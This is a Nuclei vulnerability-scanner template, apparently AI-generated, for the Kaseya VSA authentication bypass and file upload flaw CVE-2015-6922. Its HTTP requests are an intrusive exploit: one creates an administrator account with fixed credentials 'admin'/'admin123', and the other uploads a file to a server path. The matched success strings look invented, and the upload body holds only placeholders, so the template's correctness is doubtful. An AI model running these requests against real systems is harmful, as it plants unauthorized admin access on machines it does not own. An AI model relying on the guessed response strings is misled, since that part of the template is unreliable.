id: CVE-2015-6922

info:
  name: Kaseya VSA Authentication Bypass and Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: Kaseya Virtual System Administrator (VSA) 7.x before 7.0.0.33, 8.x before 8.0.0.23, 9.0 before 9.0.0.19, and 9.1 before 9.1.0.9 does not properly require authentication, allowing remote attackers to bypass authentication and add an administrative account or write to and execute arbitrary files.
  impact: |
    Successful exploitation could lead to unauthorized access and potential data leakage.
  remediation: |
    Apply the necessary patch provided by Kaseya to mitigate the vulnerability.
  reference:
    - http://www.zerodayinitiative.com/advisories/ZDI-15-448
    - http://www.zerodayinitiative.com/advisories/ZDI-15-449
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2015-6922
    cwe-id: CWE-287
    epss-score: 0.93988
    epss-percentile: 0.99256
    cpe: cpe:2.3:a:kaseya:virtual_system_administrator:*:*:*:*:*:*:*:*
  metadata:
    vendor: kaseya
    product: virtual_system_administrator
  tags: intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/LocalAuth/setAccount.aspx"

    body: |
      username=admin&password=admin123&role=admin
    matchers:
      - type: word
        words:
          - "Account created successfully"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/ConfigTab/uploader.aspx"

    body: |
      PathData=C:\\path\\to\\file&FileData=<binary_data>
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body
